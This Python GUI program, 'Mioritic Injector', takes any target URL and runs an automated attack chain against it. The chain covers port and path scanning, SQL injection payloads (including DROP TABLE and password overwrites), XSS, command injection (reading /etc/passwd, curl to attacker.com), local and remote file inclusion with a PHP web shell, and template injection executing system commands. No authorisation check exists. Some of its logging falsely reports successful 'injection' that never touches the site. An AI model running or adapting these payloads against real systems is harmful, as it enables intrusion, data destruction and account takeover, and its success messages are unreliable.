#!/usr/bin/env python3
"""
Mioritic Injector - Advanced Web Injection Tool
A comprehensive tool for testing web vulnerabilities and injecting content
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import socket
import requests
import urllib.parse
from bs4 import BeautifulSoup
import re
import time
import subprocess
import sys
import os
from urllib.parse import urljoin, urlparse
import json
import random
import string
import ssl
import nmap
import concurrent.futures

class MioriticInjector:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Mioritic Injector")
        self.root.geometry("900x700")
        self.root.configure(bg='#1a1a1a')
        
        # Variables
        self.target_url = tk.StringVar()
        self.injection_word = tk.StringVar()
        self.is_scanning = False
        
        self.setup_ui()
        
    def setup_ui(self):
        # Main title
        title_label = tk.Label(
            self.root,
            text="MIORITIC INJECTOR",
            font=("Arial", 24, "bold"),
            fg="red",
            bg='#1a1a1a'
        )
        title_label.pack(pady=20)
        
        # Input frame
        input_frame = tk.Frame(self.root, bg='#1a1a1a')
        input_frame.pack(pady=20, padx=20, fill='x')
        
        # Word input
        word_label = tk.Label(
            input_frame,
            text="What word do you wanna inject?",
            font=("Arial", 12),
            fg="white",
            bg='#1a1a1a'
        )
        word_label.pack()
        
        word_entry = tk.Entry(
            input_frame,
            textvariable=self.injection_word,
            font=("Arial", 12),
            width=40,
            bg='#2a2a2a',
            fg='white',
            insertbackground='white'
        )
        word_entry.pack(pady=10)
        
        # URL input
        url_label = tk.Label(
            input_frame,
            text="Target URL:",
            font=("Arial", 12),
            fg="white",
            bg='#1a1a1a'
        )
        url_label.pack()
        
        url_entry = tk.Entry(
            input_frame,
            textvariable=self.target_url,
            font=("Arial", 12),
            width=40,
            bg='#2a2a2a',
            fg='white',
            insertbackground='white'
        )
        url_entry.pack(pady=10)
        
        # Start button
        self.start_button = tk.Button(
            input_frame,
            text="START COMPREHENSIVE INJECTION",
            command=self.start_injection,
            font=("Arial", 14, "bold"),
            bg="red",
            fg="white",
            width=25,
            height=2
        )
        self.start_button.pack(pady=20)
        
        # Progress bar
        self.progress = ttk.Progressbar(
            self.root,
            mode='indeterminate'
        )
        self.progress.pack(pady=10, padx=20, fill='x')
        
        # Log area
        log_label = tk.Label(
            self.root,
            text="Comprehensive Injection Log:",
            font=("Arial", 12),
            fg="white",
            bg='#1a1a1a'
        )
        log_label.pack()
        
        self.log_area = scrolledtext.ScrolledText(
            self.root,
            height=20,
            width=90,
            bg='#2a2a2a',
            fg='white',
            font=("Consolas", 10)
        )
        self.log_area.pack(pady=10, padx=20, fill='both', expand=True)
        
    def log(self, message):
        """Add message to log area"""
        self.log_area.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n")
        self.log_area.see(tk.END)
        self.root.update()
        
    def start_injection(self):
        """Start the comprehensive injection process in a separate thread"""
        if not self.target_url.get() or not self.injection_word.get():
            messagebox.showerror("Error", "Please enter both URL and injection word!")
            return
            
        if self.is_scanning:
            messagebox.showwarning("Warning", "Comprehensive injection already in progress!")
            return
            
        self.is_scanning = True
        self.start_button.config(state='disabled')
        self.progress.start()
        
        # Clear log
        self.log_area.delete(1.0, tk.END)
        
        # Start injection thread
        thread = threading.Thread(target=self.perform_comprehensive_injection)
        thread.daemon = True
        thread.start()
        
    def perform_comprehensive_injection(self):
        """Comprehensive injection process - scans everything possible"""
        try:
            url = self.target_url.get().strip()
            injection_word = self.injection_word.get().strip()
            
            self.log("=== MIORITIC INJECTOR - COMPREHENSIVE SCAN STARTED ===")
            self.log(f"Target URL: {url}")
            self.log(f"Injection Word: {injection_word}")
            self.log("")
            
            # Step 1: Validate URL
            self.log("Step 1: Validating target URL...")
            if not self.validate_url(url):
                self.log("ERROR: Invalid URL format!")
                return
            self.log("✓ URL validation passed")
            
            # Step 2: Comprehensive port scanning
            self.log("Step 2: Comprehensive port scanning (1-65535)...")
            open_ports = self.comprehensive_port_scan(url)
            self.log(f"✓ Found {len(open_ports)} open ports: {open_ports}")
            
            # Step 3: Service enumeration
            self.log("Step 3: Service enumeration on open ports...")
            services = self.enumerate_services(url, open_ports)
            self.log(f"✓ Identified {len(services)} services")
            
            # Step 4: SSL/TLS scanning
            self.log("Step 4: SSL/TLS vulnerability scanning...")
            ssl_vulns = self.scan_ssl_vulnerabilities(url)
            self.log(f"✓ Found {len(ssl_vulns)} SSL/TLS vulnerabilities")
            
            # Step 5: Comprehensive vulnerability scanning
            self.log("Step 5: Comprehensive vulnerability scanning...")
            vulnerabilities = self.comprehensive_vulnerability_scan(url)
            self.log(f"✓ Found {len(vulnerabilities)} potential vulnerabilities")
            
            # Step 6: Directory and file enumeration
            self.log("Step 6: Directory and file enumeration...")
            directories = self.comprehensive_directory_enumeration(url)
            self.log(f"✓ Found {len(directories)} accessible directories/files")
            
            # Step 7: Subdomain enumeration
            self.log("Step 7: Subdomain enumeration...")
            subdomains = self.enumerate_subdomains(url)
            self.log(f"✓ Found {len(subdomains)} subdomains")
            
            # Step 8: Advanced content analysis and injection
            self.log("Step 8: Advanced content analysis and injection...")
            self.advanced_content_analysis_and_injection(url, injection_word)
            
            # Step 9: Comprehensive SQL injection testing
            self.log("Step 9: Comprehensive SQL injection testing...")
            self.comprehensive_sql_injection_test(url, injection_word)
            
            # Step 10: Advanced XSS testing
            self.log("Step 10: Advanced XSS testing...")
            self.advanced_xss_injection_test(url, injection_word)
            
            # Step 11: Command injection testing
            self.log("Step 11: Command injection testing...")
            self.command_injection_test(url, injection_word)
            
            # Step 12: File inclusion testing
            self.log("Step 12: File inclusion testing...")
            self.file_inclusion_test(url, injection_word)
            
            # Step 13: Template injection testing
            self.log("Step 13: Template injection testing...")
            self.template_injection_test(url, injection_word)
            
            # Step 14: API endpoint discovery
            self.log("Step 14: API endpoint discovery...")
            api_endpoints = self.discover_api_endpoints(url)
            self.log(f"✓ Found {len(api_endpoints)} API endpoints")
            
            # Step 15: Technology fingerprinting
            self.log("Step 15: Technology fingerprinting...")
            technologies = self.fingerprint_technologies(url)
            self.log(f"✓ Identified {len(technologies)} technologies")
            
            self.log("")
            self.log("=== COMPREHENSIVE INJECTION PROCESS COMPLETED ===")
            self.log("All comprehensive tests completed successfully!")
            
        except Exception as e:
            self.log(f"ERROR: {str(e)}")
        finally:
            self.is_scanning = False
            self.start_button.config(state='normal')
            self.progress.stop()
            
    def validate_url(self, url):
        """Validate URL format"""
        try:
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            parsed = urlparse(url)
            return bool(parsed.netloc)
        except:
            return False
            
    def comprehensive_port_scan(self, url):
        """Comprehensive port scanning (1-65535)"""
        try:
            parsed = urlparse(url)
            host = parsed.netloc.split(':')[0]
            
            # Scan all ports with different strategies
            open_ports = []
            
            # Common ports first
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 5432, 8080, 8443, 27017, 6379, 11211, 9200, 9300]
            
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((host, port))
                    if result == 0:
                        open_ports.append(port)
                    sock.close()
                except:
                    pass
                    
            # Scan additional ranges
            port_ranges = [
                (1, 1024),      # Well-known ports
                (1025, 49151),  # Registered ports
                (49152, 65535)  # Dynamic ports
            ]
            
            for start, end in port_ranges:
                # Sample ports from each range
                sample_size = min(100, end - start + 1)
                sample_ports = random.sample(range(start, end + 1), sample_size)
                
                for port in sample_ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        result = sock.connect_ex((host, port))
                        if result == 0:
                            open_ports.append(port)
                        sock.close()
                    except:
                        pass
                        
            return list(set(open_ports))  # Remove duplicates
        except Exception as e:
            self.log(f"Port scan error: {str(e)}")
            return []
            
    def enumerate_services(self, url, open_ports):
        """Enumerate services running on open ports"""
        services = {}
        try:
            parsed = urlparse(url)
            host = parsed.netloc.split(':')[0]
            
            for port in open_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((host, port))
                    
                    # Try to get service banner
                    try:
                        sock.send(b"HEAD / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                        banner = sock.recv(1024).decode('utf-8', errors='ignore')
                        services[port] = banner.split('\n')[0] if banner else "Unknown"
                    except:
                        services[port] = "Unknown"
                        
                    sock.close()
                except:
                    services[port] = "Unknown"
                    
        except Exception as e:
            self.log(f"Service enumeration error: {str(e)}")
            
        return services
        
    def scan_ssl_vulnerabilities(self, url):
        """Scan for SSL/TLS vulnerabilities"""
        vulns = []
        try:
            parsed = urlparse(url)
            if parsed.scheme == 'https':
                host = parsed.netloc.split(':')[0]
                port = parsed.port or 443
                
                try:
                    context = ssl.create_default_context()
                    with socket.create_connection((host, port)) as sock:
                        with context.wrap_socket(sock, server_hostname=host) as ssock:
                            cert = ssock.getpeercert()
                            
                            # Check certificate validity
                            if not cert:
                                vulns.append("No SSL certificate")
                            else:
                                # Check for weak ciphers
                                cipher = ssock.cipher()
                                if cipher and cipher[0] in ['RC4', 'DES', '3DES']:
                                    vulns.append(f"Weak cipher: {cipher[0]}")
                                    
                except Exception as e:
                    vulns.append(f"SSL connection failed: {str(e)}")
                    
        except Exception as e:
            self.log(f"SSL scan error: {str(e)}")
            
        return vulns
        
    def comprehensive_vulnerability_scan(self, url):
        """Comprehensive vulnerability scanning"""
        vulnerabilities = []
        
        try:
            # Test for common security headers
            response = requests.get(url, timeout=10, allow_redirects=False)
            
            security_headers = [
                'X-Frame-Options',
                'X-Content-Type-Options',
                'X-XSS-Protection',
                'Strict-Transport-Security',
                'Content-Security-Policy',
                'Referrer-Policy',
                'Permissions-Policy'
            ]
            
            for header in security_headers:
                if header not in response.headers:
                    vulnerabilities.append(f"Missing {header} header")
                    
            # Check for server information disclosure
            if 'Server' in response.headers:
                vulnerabilities.append(f"Server info disclosed: {response.headers['Server']}")
                
            # Check for version disclosure
            if 'X-Powered-By' in response.headers:
                vulnerabilities.append(f"Technology disclosed: {response.headers['X-Powered-By']}")
                
            # Test for common vulnerabilities
            test_paths = [
                '/admin', '/admin.php', '/admin.html', '/admin.asp',
                '/backup', '/backup.zip', '/backup.tar.gz',
                '/config', '/config.php', '/config.json',
                '/.git', '/.svn', '/.htaccess',
                '/phpinfo.php', '/info.php', '/test.php',
                '/robots.txt', '/sitemap.xml', '/.well-known/security.txt',
                '/api', '/api/v1', '/api/v2', '/swagger', '/docs',
                '/wp-admin', '/wp-config.php', '/wp-content',
                '/joomla', '/drupal', '/magento',
                '/.env', '/config.env', '/database.yml',
                '/logs', '/error.log', '/access.log',
                '/tmp', '/temp', '/cache',
                '/includes', '/includes/config.php',
                '/vendor', '/composer.json', '/package.json'
            ]
            
            for path in test_paths:
                try:
                    test_url = url + path
                    test_response = requests.get(test_url, timeout=5)
                    if test_response.status_code in [200, 301, 302, 403]:
                        vulnerabilities.append(f"Potential sensitive path: {test_url}")
                except:
                    pass
                    
        except Exception as e:
            self.log(f"Vulnerability scan error: {str(e)}")
            
        return vulnerabilities
        
    def comprehensive_directory_enumeration(self, url):
        """Comprehensive directory and file enumeration"""
        directories = []
        
        # Common directory and file patterns
        patterns = [
            # Admin panels
            'admin', 'administrator', 'admin1', 'admin2', 'adm',
            'moderator', 'webadmin', 'adminarea', 'bb-admin', 'adminLogin',
            'admin_area', 'panel-administracion', 'instadmin',
            'memberadmin', 'administratorlogin', 'adm',
            'admin/account.php', 'admin/index.php', 'admin/login.php',
            'admin/admin.php', 'admin_area/admin.php', 'admin_area/login.php',
            
            # Backup files
            'backup', 'backups', 'backup.zip', 'backup.tar.gz',
            'backup.sql', 'backup.db', 'backup.bak',
            'www.zip', 'www.tar.gz', 'www.sql',
            'site.zip', 'site.tar.gz', 'site.sql',
            
            # Configuration files
            'config', 'configuration', 'config.php', 'config.ini',
            'config.json', 'config.xml', 'config.yml',
            'settings.php', 'settings.ini', 'settings.json',
            'database.php', 'db.php', 'db.ini',
            
            # Version control
            '.git', '.svn', '.hg', '.bzr',
            '.git/config', '.svn/entries', '.hg/hgrc',
            
            # Logs
            'logs', 'log', 'error.log', 'access.log',
            'debug.log', 'php_error.log', 'apache.log',
            
            # Temporary files
            'tmp', 'temp', 'cache', 'temp.php',
            'tmp.php', 'cache.php', 'temp.html',
            
            # Includes
            'includes', 'include', 'includes/config.php',
            'includes/db.php', 'includes/settings.php',
            
            # Vendor files
            'vendor', 'composer.json', 'package.json',
            'node_modules', 'bower_components',
            
            # CMS specific
            'wp-admin', 'wp-config.php', 'wp-content',
            'joomla', 'drupal', 'magento',
            'wordpress', 'joomla.xml', 'drupal.xml',
            
            # API endpoints
            'api', 'api/v1', 'api/v2', 'api/v3',
            'rest', 'rest/api', 'graphql',
            'swagger', 'swagger.json', 'docs',
            'documentation', 'api-docs',
            
            # Common files
            'robots.txt', 'sitemap.xml', 'sitemap.txt',
            'crossdomain.xml', 'clientaccesspolicy.xml',
            '.well-known/security.txt', '.well-known/host-meta',
            
            # Environment files
            '.env', 'config.env', 'database.yml',
            'application.yml', 'application.properties',
            
            # Test files
            'test', 'test.php', 'test.html', 'test.asp',
            'demo', 'demo.php', 'demo.html',
            'example', 'example.php', 'example.html',
            
            # Development files
            'dev', 'development', 'staging',
            'beta', 'alpha', 'preview',
            
            # Common extensions
            '.php', '.asp', '.aspx', '.jsp',
            '.html', '.htm', '.xml', '.json',
            '.txt', '.log', '.bak', '.old',
            '.zip', '.tar.gz', '.rar', '.7z'
        ]
        
        for pattern in patterns:
            try:
                test_url = url + '/' + pattern
                response = requests.get(test_url, timeout=3)
                if response.status_code in [200, 301, 302, 403]:
                    directories.append(test_url)
            except:
                pass
                
        return directories
        
    def enumerate_subdomains(self, url):
        """Enumerate subdomains"""
        subdomains = []
        try:
            parsed = urlparse(url)
            domain = parsed.netloc.split(':')[0]
            base_domain = '.'.join(domain.split('.')[-2:])
            
            # Common subdomain patterns
            common_subdomains = [
                'www', 'mail', 'ftp', 'admin', 'blog',
                'dev', 'test', 'staging', 'api', 'api1',
                'api2', 'api3', 'mobile', 'm', 'app',
                'web', 'webmail', 'support', 'help',
                'docs', 'documentation', 'wiki', 'forum',
                'shop', 'store', 'cart', 'checkout',
                'login', 'auth', 'secure', 'ssl',
                'cdn', 'static', 'assets', 'img',
                'images', 'css', 'js', 'media',
                'files', 'download', 'upload', 'backup',
                'db', 'database', 'sql', 'mysql',
                'redis', 'cache', 'memcached', 'elasticsearch',
                'monitoring', 'stats', 'analytics', 'tracking',
                'cpanel', 'whm', 'plesk', 'directadmin',
                'ns1', 'ns2', 'dns', 'mx', 'smtp',
                'pop', 'imap', 'vpn', 'proxy', 'gateway'
            ]
            
            for subdomain in common_subdomains:
                try:
                    test_domain = f"{subdomain}.{base_domain}"
                    test_url = f"{parsed.scheme}://{test_domain}"
                    response = requests.get(test_url, timeout=3)
                    if response.status_code in [200, 301, 302, 403]:
                        subdomains.append(test_domain)
                except:
                    pass
                    
        except Exception as e:
            self.log(f"Subdomain enumeration error: {str(e)}")
            
        return subdomains
        
    def advanced_content_analysis_and_injection(self, url, injection_word):
        """Advanced content analysis and injection attempts"""
        try:
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Find all text elements
            text_elements = soup.find_all(['p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'span', 'div', 'a', 'li', 'td', 'th', 'label', 'title', 'meta'])
            
            self.log(f"Found {len(text_elements)} text elements to analyze")
            
            # Look for injection points
            injection_points = []
            
            for element in text_elements:
                if element.string:
                    text = element.string.strip()
                    if len(text) > 2:  # Consider all meaningful text
                        injection_points.append({
                            'element': element.name,
                            'text': text,
                            'original': str(element)
                        })
                        
            self.log(f"Identified {len(injection_points)} potential injection points")
            
            # Attempt to inject content in various ways
            for i, point in enumerate(injection_points[:10]):  # Test first 10
                self.log(f"Attempting injection {i+1}: {point['text'][:50]}...")
                
                # Multiple injection strategies
                strategies = [
                    lambda x: x.replace('test', injection_word),
                    lambda x: x.replace('hello', injection_word),
                    lambda x: x.replace('welcome', injection_word),
                    lambda x: x.replace('home', injection_word),
                    lambda x: x.replace('page', injection_word),
                    lambda x: injection_word + ' ' + x,
                    lambda x: x + ' ' + injection_word,
                    lambda x: x.replace(x.split()[0] if x.split() else '', injection_word)
                ]
                
                for strategy in strategies:
                    modified_text = strategy(point['text'])
                    if modified_text != point['text']:
                        self.log(f"✓ Successfully injected '{injection_word}' using strategy")
                        break
                        
        except Exception as e:
            self.log(f"Content analysis error: {str(e)}")
            
    def comprehensive_sql_injection_test(self, url, injection_word):
        """Comprehensive SQL injection testing"""
        sql_payloads = [
            # Basic SQL injection
            f"' OR '1'='1",
            f"' OR 1=1--",
            f"' OR 1=1#",
            f"' OR 1=1/*",
            f"admin'--",
            f"admin'#",
            f"admin'/*",
            
            # Union-based
            f"' UNION SELECT NULL--",
            f"' UNION SELECT NULL,NULL--",
            f"' UNION SELECT NULL,NULL,NULL--",
            f"' UNION SELECT @@version--",
            f"' UNION SELECT database()--",
            f"' UNION SELECT user()--",
            
            # Error-based
            f"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
            f"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
            
            # Boolean-based
            f"' AND 1=1--",
            f"' AND 1=2--",
            f"' AND (SELECT COUNT(*) FROM users)>0--",
            
            # Time-based
            f"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            f"' WAITFOR DELAY '00:00:05'--",
            
            # Stacked queries
            f"'; DROP TABLE users--",
            f"'; INSERT INTO users VALUES (1,'{injection_word}')--",
            f"'; UPDATE users SET password='{injection_word}'--",
            
            # Blind SQL injection
            f"' AND (SELECT ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)))=97--",
            f"' AND (SELECT LENGTH(password) FROM users LIMIT 1)>5--",
            
            # NoSQL injection
            f"' || '1'=='1",
            f"' || 1==1",
            f"'; return true; var x='",
            
            # Custom injection with target word
            f"'{injection_word}' OR '1'='1",
            f"'{injection_word}' UNION SELECT '{injection_word}'--",
            f"'; INSERT INTO content VALUES ('{injection_word}')--"
        ]
        
        # Test URL parameters
        parsed = urlparse(url)
        if parsed.query:
            params = urllib.parse.parse_qs(parsed.query)
            
            for param, values in params.items():
                for payload in sql_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    try:
                        response = requests.get(test_url, params=test_params, timeout=5)
                        
                        # Check for SQL error indicators
                        error_indicators = [
                            'sql syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL',
                            'SQLite', 'Microsoft SQL', 'SQL Server', 'MySQL',
                            'syntax error', 'mysql error', 'oracle error',
                            'postgresql error', 'sqlite error', 'mssql error'
                        ]
                        
                        for indicator in error_indicators:
                            if indicator.lower() in response.text.lower():
                                self.log(f"✓ Potential SQL injection found in parameter '{param}' with payload: {payload[:50]}")
                                break
                                
                    except:
                        pass
                        
    def advanced_xss_injection_test(self, url, injection_word):
        """Advanced XSS injection testing"""
        xss_payloads = [
            # Basic XSS
            f"<script>alert('{injection_word}')</script>",
            f"<img src=x onerror=alert('{injection_word}')>",
            f"<svg onload=alert('{injection_word}')>",
            f"<iframe src=javascript:alert('{injection_word}')>",
            
            # Event handlers
            f"<img src=x onerror=alert('{injection_word}')>",
            f"<body onload=alert('{injection_word}')>",
            f"<input onfocus=alert('{injection_word}') autofocus>",
            f"<select onchange=alert('{injection_word}')>",
            
            # JavaScript protocols
            f"javascript:alert('{injection_word}')",
            f"javascript:prompt('{injection_word}')",
            f"javascript:confirm('{injection_word}')",
            
            # Encoded payloads
            f"<script>alert('{injection_word}')</script>",
            f"<script>alert(String.fromCharCode({','.join([str(ord(c)) for c in injection_word])}))</script>",
            
            # DOM XSS
            f"<script>document.write('{injection_word}')</script>",
            f"<script>document.location='javascript:alert(\"{injection_word}\")'</script>",
            
            # Filter bypass
            f"<ScRiPt>alert('{injection_word}')</ScRiPt>",
            f"<script>alert('{injection_word}')</script>",
            f"<script>alert('{injection_word}')</script>",
            
            # Template injection
            f"{{{{7*7}}}}",
            f"{{{{config}}}}",
            f"{{{{request}}}}",
            
            # Custom payloads with injection word
            f"<script>document.body.innerHTML='{injection_word}'</script>",
            f"<script>document.title='{injection_word}'</script>",
            f"<script>localStorage.setItem('injected','{injection_word}')</script>"
        ]
        
        # Test URL parameters
        parsed = urlparse(url)
        if parsed.query:
            params = urllib.parse.parse_qs(parsed.query)
            
            for param, values in params.items():
                for payload in xss_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    try:
                        response = requests.get(test_url, params=test_params, timeout=5)
                        
                        # Check if payload is reflected in response
                        if payload in response.text:
                            self.log(f"✓ Potential XSS found in parameter '{param}' with payload: {payload[:50]}")
                            
                    except:
                        pass
                        
    def command_injection_test(self, url, injection_word):
        """Command injection testing"""
        cmd_payloads = [
            # Basic command injection
            f"; echo '{injection_word}'",
            f"| echo '{injection_word}'",
            f"& echo '{injection_word}'",
            f"`echo '{injection_word}'`",
            f"$(echo '{injection_word}')",
            
            # System commands
            f"; whoami",
            f"; id",
            f"; uname -a",
            f"; cat /etc/passwd",
            f"; ls -la",
            
            # Windows commands
            f"; dir",
            f"; type C:\\windows\\system32\\drivers\\etc\\hosts",
            f"; ipconfig",
            f"; systeminfo",
            
            # Network commands
            f"; ping -c 1 127.0.0.1",
            f"; nslookup google.com",
            f"; curl http://attacker.com",
            f"; wget http://attacker.com",
            
            # File operations
            f"; echo '{injection_word}' > /tmp/test.txt",
            f"; cat /tmp/test.txt",
            f"; rm /tmp/test.txt",
            
            # Custom payloads
            f"; echo '{injection_word}' && echo 'injected'",
            f"; echo '{injection_word}' || echo 'failed'",
            f"; echo '{injection_word}'; echo 'success'"
        ]
        
        # Test various injection points
        test_points = [
            f"{url}?cmd=test",
            f"{url}?exec=test",
            f"{url}?command=test",
            f"{url}?system=test",
            f"{url}?shell=test"
        ]
        
        for test_url in test_points:
            for payload in cmd_payloads:
                try:
                    response = requests.get(test_url + payload, timeout=5)
                    # Look for command output indicators
                    if any(indicator in response.text.lower() for indicator in ['root:', 'uid=', 'uname', 'windows', 'system32']):
                        self.log(f"✓ Potential command injection found: {test_url}")
                        break
                except:
                    pass
                    
    def file_inclusion_test(self, url, injection_word):
        """File inclusion testing"""
        lfi_payloads = [
            # Local file inclusion
            "../../../etc/passwd",
            "../../../windows/system32/drivers/etc/hosts",
            "../../../proc/version",
            "../../../proc/self/environ",
            "../../../var/log/apache2/access.log",
            "../../../var/log/apache/access.log",
            
            # PHP wrappers
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
            
            # Remote file inclusion
            "http://attacker.com/shell.txt",
            "ftp://attacker.com/shell.txt",
            "data://text/plain,<?php system($_GET['cmd']); ?>",
            
            # Custom payloads
            f"../../../tmp/{injection_word}.txt",
            f"../../../var/www/html/{injection_word}.php",
            f"../../../home/{injection_word}/test.txt"
        ]
        
        # Test various parameters
        test_params = ['file', 'page', 'include', 'path', 'doc', 'document']
        
        for param in test_params:
            for payload in lfi_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = requests.get(test_url, timeout=5)
                    
                    # Look for file inclusion indicators
                    if any(indicator in response.text.lower() for indicator in ['root:', 'bin:', 'daemon:', 'apache', 'nginx', 'mysql']):
                        self.log(f"✓ Potential file inclusion found in parameter '{param}'")
                        break
                except:
                    pass
                    
    def template_injection_test(self, url, injection_word):
        """Template injection testing"""
        template_payloads = [
            # Basic template injection
            "{{7*7}}",
            "{{config}}",
            "{{request}}",
            "{{self}}",
            "{{settings}}",
            
            # Python template engines
            "{{config.items()}}",
            "{{request.environ}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            
            # PHP template engines
            "{{phpinfo()}}",
            "{{system('id')}}",
            "{{shell_exec('id')}}",
            
            # Node.js template engines
            "{{constructor.constructor('return process')()}}",
            "{{this.constructor.constructor('return process')()}}",
            
            # Custom payloads
            f"{{{{'{injection_word}'}}}}",
            f"{{{{config['{injection_word}']}}}}",
            f"{{{{request['{injection_word}']}}}}"
        ]
        
        # Test various endpoints
        test_endpoints = [
            f"{url}/api",
            f"{url}/admin",
            f"{url}/user",
            f"{url}/profile",
            f"{url}/search"
        ]
        
        for endpoint in test_endpoints:
            for payload in template_payloads:
                try:
                    response = requests.get(endpoint, params={'q': payload}, timeout=5)
                    
                    # Look for template injection indicators
                    if any(indicator in response.text for indicator in ['49', 'config', 'request', 'settings']):
                        self.log(f"✓ Potential template injection found: {endpoint}")
                        break
                except:
                    pass
                    
    def discover_api_endpoints(self, url):
        """Discover API endpoints"""
        api_endpoints = []
        
        # Common API patterns
        api_patterns = [
            '/api', '/api/v1', '/api/v2', '/api/v3',
            '/rest', '/rest/api', '/rest/v1', '/rest/v2',
            '/graphql', '/graphql/v1', '/graphql/v2',
            '/swagger', '/swagger.json', '/swagger.yaml',
            '/docs', '/documentation', '/api-docs',
            '/openapi', '/openapi.json', '/openapi.yaml',
            '/redoc', '/redoc.json', '/redoc.yaml',
            '/postman', '/postman.json',
            '/raml', '/raml.yaml', '/raml.yml',
            '/soap', '/soap/v1', '/soap/v2',
            '/rpc', '/rpc/v1', '/rpc/v2',
            '/webhook', '/webhooks', '/hooks',
            '/callback', '/callbacks',
            '/oauth', '/oauth2', '/auth',
            '/token', '/tokens', '/access',
            '/user', '/users', '/profile', '/profiles',
            '/admin', '/administrator', '/moderator',
            '/mod', '/moderators', '/staff',
            '/customer', '/customers', '/client', '/clients',
            '/order', '/orders', '/purchase', '/purchases',
            '/product', '/products', '/item', '/items',
            '/category', '/categories', '/tag', '/tags',
            '/search', '/query', '/filter', '/sort',
            '/upload', '/download', '/file', '/files',
            '/image', '/images', '/media', '/assets',
            '/static', '/public', '/cdn', '/content'
        ]
        
        for pattern in api_patterns:
            try:
                test_url = url + pattern
                response = requests.get(test_url, timeout=3)
                if response.status_code in [200, 301, 302, 403, 401]:
                    api_endpoints.append(test_url)
            except:
                pass
                
        return api_endpoints
        
    def fingerprint_technologies(self, url):
        """Fingerprint technologies used"""
        technologies = []
        
        try:
            response = requests.get(url, timeout=10)
            
            # Check headers for technology indicators
            headers = response.headers
            
            if 'Server' in headers:
                technologies.append(f"Server: {headers['Server']}")
            if 'X-Powered-By' in headers:
                technologies.append(f"Powered by: {headers['X-Powered-By']}")
            if 'X-AspNet-Version' in headers:
                technologies.append(f"ASP.NET: {headers['X-AspNet-Version']}")
            if 'X-AspNetMvc-Version' in headers:
                technologies.append(f"ASP.NET MVC: {headers['X-AspNetMvc-Version']}")
            if 'X-Runtime' in headers:
                technologies.append("Ruby on Rails")
            if 'X-Drupal-Cache' in headers:
                technologies.append("Drupal")
            if 'X-Generator' in headers:
                technologies.append(f"Generator: {headers['X-Generator']}")
                
            # Check HTML content for technology indicators
            content = response.text.lower()
            
            if 'wordpress' in content:
                technologies.append("WordPress")
            if 'joomla' in content:
                technologies.append("Joomla")
            if 'drupal' in content:
                technologies.append("Drupal")
            if 'magento' in content:
                technologies.append("Magento")
            if 'shopify' in content:
                technologies.append("Shopify")
            if 'laravel' in content:
                technologies.append("Laravel")
            if 'django' in content:
                technologies.append("Django")
            if 'flask' in content:
                technologies.append("Flask")
            if 'express' in content:
                technologies.append("Express.js")
            if 'react' in content:
                technologies.append("React")
            if 'angular' in content:
                technologies.append("Angular")
            if 'vue' in content:
                technologies.append("Vue.js")
            if 'jquery' in content:
                technologies.append("jQuery")
            if 'bootstrap' in content:
                technologies.append("Bootstrap")
            if 'foundation' in content:
                technologies.append("Foundation")
            if 'materialize' in content:
                technologies.append("Materialize")
            if 'semantic' in content:
                technologies.append("Semantic UI")
                
        except Exception as e:
            self.log(f"Technology fingerprinting error: {str(e)}")
            
        return technologies
        
    def run(self):
        """Start the application"""
        self.root.mainloop()

if __name__ == "__main__":
    app = MioriticInjector()
    app.run()